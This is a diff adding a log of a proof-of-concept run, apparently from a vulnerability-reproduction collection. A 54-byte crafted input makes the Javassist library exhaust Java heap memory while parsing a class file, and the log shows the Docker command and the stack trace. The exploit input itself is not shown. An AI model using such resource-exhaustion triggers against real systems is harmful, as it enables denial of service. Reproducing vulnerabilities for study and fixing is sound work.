@@ -1,0 +1,14 @@
+$ docker run --rm real-vuln-poc:real_vulns-45_javassist_java_resource_exhaustion-javassist_classfuzzer_oom-76574994
+Input size: 54 bytes
+[!] OutOfMemoryError triggered: Java heap space
+java.lang.OutOfMemoryError: Java heap space
+	at javassist.bytecode.AttributeInfo.<init>(AttributeInfo.java:70)
+	at javassist.bytecode.AttributeInfo.read(AttributeInfo.java:142)
+	at javassist.bytecode.MethodInfo.read(MethodInfo.java:568)
+	at javassist.bytecode.MethodInfo.<init>(MethodInfo.java:109)
+	at javassist.bytecode.ClassFile.read(ClassFile.java:817)
+	at javassist.bytecode.ClassFile.<init>(ClassFile.java:185)
+	at javassist.CtClassType.<init>(CtClassType.java:98)
+	at javassist.ClassPool.makeClass(ClassPool.java:707)
+	at javassist.ClassPool.makeClass(ClassPool.java:685)
+	at Poc.main(Poc.java:47)
